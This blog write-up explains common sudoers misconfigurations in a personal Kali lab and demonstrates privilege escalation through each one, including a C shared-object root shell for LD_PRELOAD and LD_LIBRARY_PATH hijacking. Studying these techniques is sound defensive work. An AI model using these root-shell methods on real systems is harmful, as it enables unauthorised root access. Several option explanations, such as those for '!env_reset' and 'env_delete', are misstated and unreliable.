---
title: "Becoming a Super Soldier (Common /etc/sudoers misconfigurations)"
description: A simple writeup on common /etc/sudoers misconfigurations and their associated privilege escalation techniques. Simply because I am still very blur about this technique.
date: 2025-11-09T07:54:25-05:00
image: 
tags:
    - Linux
categories:
    - Personal-Research
comments: false
---
## Background
1. To edit `/etc/sudoers`, use `visudo`
	```
	sudo visudo
	```
2. To verify current sudo configuration,
	```
	# Validate sudoers syntax first
	sudo visudo -c
	# Force re‑auth then cache credentials
	sudo -k && sudo -v
	# Confirm what the user can do
	sudo -l
	```
	- `sudo -k`: Remove current cached credentials
	- `sudo -v`: Reauthenticate user

## Default `sudo -l`
1. A user that is created normally would not be able to run `sudo`
	```
	sudo useradd normaluser
	sudo passwd normaluser
	```
	When we run sudo,
	```
	$ sudo -l
	[sudo] password for normaluser: 
	Sorry, user normaluser may not run sudo on kali.
	```
2. We have to add the user to the `sudo` group or explicitly define the permissions of the user in order for the user to use `sudo` 
3. This is the default sudoers file in Kali
	```sh
	sudo cat /etc/sudoers | grep -v "#\|^$" 
	Defaults        env_reset
	Defaults        mail_badpass
	Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
	Defaults        use_pty
	root    ALL=(ALL:ALL) ALL
	%sudo   ALL=(ALL:ALL) ALL
	@includedir /etc/sudoers.d
	```
	- `env_reset`: Means environment variables will be reset. Very important because some commands functions differently based on environment variables
	- `mail_badpass`: Sends email if there is an authentication error
	- `secure_path`: Specify the `$PATH` env variable for root in `sudo`. Very important because we may be able to change the binary that is actually executed
	- `use_pty`: Uses a virtual terminal. Helps prevent some attacks
	- `root    ALL=(ALL:ALL) ALL`: Root can run any command as any user and any group
	- `%sudo   ALL=(ALL:ALL) ALL`: The sudo group can run any command as any user and any group
## Allow user to run all commands as root
1. The easiest way is to add the user to the `sudo` group
	```sh
	sudo usermod -aG sudo normaluser
	```
	Output:
	```
	$ sudo -l
	[sudo] password for normaluser: 
	Matching Defaults entries for normaluser on kali:
	    env_reset, mail_badpass,
	    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
	    use_pty
	
	User normaluser may run the following commands on kali:
	    (ALL : ALL) ALL
	```
2. To remove the user from the sudoers group,
	```sh
	sudo gpasswd --delete normaluser sudo
	```
## Allow user to run all commands as another user or group
1. To achieve this, we need to edit the sudoers file directly
	```sh
	# User privilege specification
	root    ALL=(ALL:ALL) ALL
	normaluser ALL=(kali:kali) ALL
	```
- In this case, the user `normaluser` can run commands as user and group `kali`
2. There is a privilege escalation opportunity if `kali` is part of `sudo` groups/ have extra sudo privileges
	```
	$ sudo -l
	Matching Defaults entries for normaluser on kali:
	    env_reset, mail_badpass,
	    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
	    use_pty
	
	User normaluser may run the following commands on kali:
	    (kali : kali) ALL
	$ sudo -u kali bash
	┌──(kali㉿kali)-[~/learning_materials/learn_sudoers]
	└─$ groups
	kali sudo
	```
## Allow user to run specific commands as sudo
1. To achieve it, modify the sudoers like this
	```
	# User privilege specification
	root    ALL=(ALL:ALL) ALL
	normaluser ALL=(root:root) /usr/bin/env
	```
- `normaluser` can run `/usr/bin/env` as root
2. Depending on the binary, it can be a privilege escalation vulnerability/opportunity
	```
	$sudo -l
	Matching Defaults entries for normaluser on kali:
	    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
	
	User normaluser may run the following commands on kali:
	    (root : root) /usr/bin/env
	$ sudo env /bin/bash
	┌──(root㉿kali)-[/home/kali/learning_materials/learn_sudoers]
	└─# 
	```
- Refer https://gtfobins.github.io/
## Allow user to run sudo without password
1. To do so, specify the `NOPASSWD` rule
	```
	# User privilege specification
	root    ALL=(ALL:ALL) ALL
	normaluser ALL=(root) NOPASSWD: /usr/bin/expect
	```
	- We can now run commands without knowing the password of `normaluser`. 
	- Only use this option in a controlled setting
	- It is usually used in automation scripts
2. Still a privilege escalation opportunity.
	```
	$ sudo -l
	Matching Defaults entries for normaluser on kali:
	    env_reset, mail_badpass,
	    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
	    use_pty
	
	User normaluser may run the following commands on kali:
	    (root) NOPASSWD: /usr/bin/expect
	$ sudo /usr/bin/expect -c 'spawn /bin/sh;interact'
	spawn /bin/sh
	# id
	uid=0(root) gid=0(root) groups=0(root)
	```
## Preserve Environment Variables
1. This is an insecure configuration as a lot of binaries works differently based on the presence of certain environment variables and we can preload certain Shared Objects.
2. To preserve environment variables except $PATH,
	```sh
	Defaults:!normaluser env_reset
	# ...
	Defaults:normaluser !env_reset
	Defaults:normaluser env_delete+=PATH
	
	# User privilege specification
	root    ALL=(ALL:ALL) ALL
	normaluser kali=(root) SETENV: /usr/bin/ls -la
	```
	- `Defaults:normaluser`: This configuration affects normaluser only
	- `!env_reset`: Reset environment variables
	- `env_delete+=PATH`: Don't reset the PATH variable. It prevents other bypasses
	- `SETENV` is required because Linux does not allow us to set `LD_PRELOAD`, `LD_LIBRARY_PATH` or other dangerous variables
	Output:
	```
	$ sudo -l
	Matching Defaults entries for normaluser on kali:
	    mail_badpass,
	    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
	    !env_reset, env_delete+=PATH, use_pty
	
	User normaluser may run the following commands on
	        kali:
	    (root) SETENV: /usr/bin/ls -la
	```
3. Although `ls -la` do not have a privilege escalation opportunity, the fact that environment variables are kept allows shared object exploit.
	First, create a file called `root.c`
	```c
	#include <stdio.h>
	#include <sys/types.h>
	#include <stdlib.h>
	#include <unistd.h>
	
	void _init() {
	unsetenv("LD_PRELOAD"); // important to prevent infinite loops apparently
	setgid(0);
	setuid(0);
	system("/bin/bash");
	}
	```
	Compile it as a shared object.
	```sh
	gcc -fPIC -shared -o root.so root.c -nostartfiles
	```
	Then, pass `LD_PRELOAD` as an environment variable when calling the binary. This loads the SO, which is then executed like any executable.
	```
	sudo LD_PRELOAD=`pwd`/root.so /usr/bin/ls -la
	```
	Output:
	```
	$ sudo LD_PRELOAD=`pwd`/root.so /usr/bin/ls -la
	root@kali:/home/kali/learning_materials/learn_sudoers# 
	```
4. Reflection: This is interesting as I swear previously the SETENV flag was not required for this type of privilege escalation
## Preserve selected Environment Variables 
1. To preserve only certain environment variables (safer),
	```sh
	Defaults env_reset
	Defaults:normaluser env_keep+=LD_LIBRARY_PATH
	# User privilege specification
	normaluser kali=(root) /home/kali/learning_materials/learn_sudoers/test2
	```
	Output:
	```
	$ sudo -l
	Matching Defaults entries for normaluser on kali:
	    env_reset, mail_badpass,
	    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
	    env_keep+=LD_LIBRARY_PATH, use_pty
	
	User normaluser may run the following commands on kali:
	    (root) /home/kali/learning_materials/learn_sudoers/test2
	```
2. This configuration is unfortunately still vulnerable to a privilege escalation technique.
	Identify one of the linked libraries in use.
	```
	$ ldd test2
	        linux-vdso.so.1 (0x00007f9cff805000)
	        libfoo.so => not found
	        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f9cff5ea000)
	        /lib64/ld-linux-x86-64.so.2 (0x00007f9cff807000)
	```
	Compile the previous binary as one of the linked libraries
	```
	gcc -fPIC -shared -o libfoo.so root.c -nostartfiles
	```
	Set the Linked library path to the current directory
	```
	sudo LD_LIBRARY_PATH=`pwd`:$LD_LIBRARY_PATH /home/kali/learning_materials/learn_sudoers/test2
	```
	Output:
	```
	┌──(root㉿kali)-[/home/kali/learning_materials/learn_sudoers]
	└─# id
	uid=0(root) gid=0(root) groups=0(root)
	```
## Preserve selected Environment Variables 2
1. To preserve only certain environment variables (safer),
	```sh
	Defaults env_reset
	Defaults:normaluser env_keep+=PATH
	# User privilege specification
	normaluser kali=(root) ls -la
	```
2. This configuration is unfortunately still vulnerable to a privilege escalation technique.
	Create a rootshell binary
	```c
	// root.c
	#include <stdio.h>
	#include <sys/types.h>
	#include <stdlib.h>
	#include <unistd.h>
	
	void main() {
	setgid(0);
	setuid(0);
	system("/bin/bash");
	}
	```
	Compile the root shell binary as the allowed binary
	```
	gcc root_not_so.c -o ls
	```
	Set the PATH variable
	```
	$ PATH=`pwd`:$PATH
	$ echo $PATH
	/home/kali/learning_materials/learn_sudoers:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games
	```
	Execute the sudo command
	- This does not work in the current version of `sudo`: `/etc/sudoers:49:24: expected a fully-qualified path name`

## References
1. Sudoers Manual: https://www.sudo.ws/docs/man/sudoers.man/
2. Good Medium Post on Sudoers misconfigurations: https://medium.com/@mysticraganork66/why-misconfigured-sudo-is-a-hackers-playground-3e23ab15c889